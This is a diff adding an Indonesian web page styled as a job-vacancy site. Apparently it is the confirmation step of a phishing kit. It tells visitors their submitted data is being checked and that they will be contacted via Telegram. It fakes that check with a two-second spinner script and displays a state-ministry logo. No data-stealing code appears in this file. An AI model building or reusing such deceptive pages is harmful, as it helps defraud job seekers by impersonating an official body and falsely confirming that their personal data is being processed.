@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en" class="h-100">
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
+      crossorigin="anonymous"
+    />
+    <link href="css/custom.css" type="text/css" rel="stylesheet" />
+    <link href="css/menebus.css" type="text/css" rel="stylesheet" />
+    <link rel="icon" href="./css/img/garuda.png" type="image/x-icon" />
+
+    <!-- Open Graph meta tags -->
+    <meta property="og:title" content="LOKER TERBARU" />
+    <meta
+      property="og:description"
+      content="LOWONGAN KERJA TERBARU SE-INDONESIA 2024-2025"
+    />
+    <meta
+      property="og:image"
+      content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEinTH-PBwKTf10wqnmMcCLmiq7yCG-bzSt9yo13OIopd2lruS_VivY_U03bafO_aP7holcrN-OXT1ZNM-sStObKfm08ImcxLFRxPNll5htbg7tE5c0JYd5eixLFqVym72SijO9aiRrSpyExUDYdKaBtXO88FAunTkx6SjwPO4VWI4zj8vG3skJsBeFTBJDl/s600/jagi5juta.png"
+    />
+    <meta property="og:url" content="https://yourwebsite.com" />
+    <meta property="og:type" content="website" />
+
+    <!-- Style khusus untuk footer -->
+    <style>
+      /* overlay.css */
+      .overlay {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 1000;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .spinner {
+        width: 50px;
+        height: 50px;
+        border: 5px solid rgba(255, 255, 255, 0.3);
+        border-top: 5px solid white;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        from {
+          transform: rotate(0deg);
+        }
+
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .footer-banner img {
+        width: 100%;
+        /* Menyesuaikan lebar gambar dengan kolom input */
+        max-width: 400px;
+        /* Atur batas maksimum lebar jika diperlukan */
+        height: auto;
+        /* Mempertahankan rasio aspek gambar */
+        display: block;
+        margin: 0 auto;
+        /* Memposisikan gambar di tengah */
+        padding: 10px 0;
+        /* Menambahkan jarak vertikal di atas dan bawah */
+      }
+    </style>
+
+    <title>LOKER TERBARU</title>
+  </head>
+
+  <body class="d-flex flex-column h-100">
+    <!-- Overlay -->
+    <div id="overlay" class="overlay">
+      <div class="spinner"></div>
+    </div>
+
+    <main class="flex-shrink-0">
+      <div class="container container-narrow">
+        <div class="header mt-3 text-center">
+          <img src="jsss.jpg" class="img-fluid" width="350" />
+        </div>
+
+        <div class="four">
+          <div class="container">
+            <p
+              style="
+                background: #173865;
+                color: #f1f3f5;
+                padding-top: 1px;
+                margin-bottom: 6px;
+                padding-bottom: 0px;
+                height: 31px;
+                font-size: 14px;
+                text-align: center;
+              "
+            >
+              &nbsp; STATUS ANDA SEDANG DALAM PENGECEKAN.<br /><br />
+            </p>
+            <section
+              style="border: 1px solid #c2c5c8; padding: 12px 20px 20px 20px"
+            >
+              <form
+                action="javascript:void(0)"
+                method="post"
+                id="fourForm"
+                enctype="multipart/form-data"
+              >
+                <div class="mb-3">
+                  <p class="fw-bold mt-2 page-header text-center">
+                    <span id="ctl00_RecipientMasterContent_lblSubject"
+                      >JIKA DATA ANDA TELAH DI TERIMA KAMI AKAN MENGIRIMKAN
+                      PESAN MELALUI TELEGRAM</span
+                    >
+                  </p>
+                </div>
+                <br />
+                <div class="mb-3">
+                  <p class="fw-bold mt-2 page-header text-center">
+                    <span id="ctl00_RecipientMasterContent_lblSubject"
+                      >PASTIKAN DATA YANG ANDA MASUKAN BARUSAN SUDAH BENAR</span
+                    >
+                  </p>
+                </div>
+                <section class="text-center" style="padding-top: 24px">
+                  <input
+                    class="btn btn-primary"
+                    type="submit"
+                    onclick="redirectToHome()"
+                    style="
+                      width: 280.65px;
+                      font-weight: bold;
+                      background: rgb(245, 15, 0);
+                    "
+                    value="KONFIRMASI"
+                  />
+                </section>
+              </form>
+            </section>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <script>
+      function redirectToHome() {
+        // Tampilkan overlay
+        document.getElementById("overlay").style.display = "flex";
+
+        // Simulasi proses verifikasi dan redirect
+        setTimeout(function () {
+          alert("Status sedang dicek, mohon tunggu.");
+          window.location.href = "index.html"; // Redirect ke halaman utama atau sesuai keinginan
+        }, 2000); // Delay 2 detik untuk simulasi proses
+      }
+    </script>
+    <!-- Gambar di bawah Form -->
+    <div class="footer-banner">
+      <img
+        src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrGBJxiOL6WMka-Ml_ECzYj0rPQpcJs4F6ihZeayj0IYjlaMX1JpzUWIx0KBEI_Jwtrjo-OYmcJAcfDusSANGQt652a7nVIJE779kTcIYN4xI6Rl-z2mblbLmIc--wu_ib_4mM9MQMHaqhYv8d-gE6veXMLcmUyVzDKhjt33OmQzKBBABb_MJ3cpQVIw/s600/kementerianbumnlogo.png"
+      />
+    </div>
+  </body>
+</html>
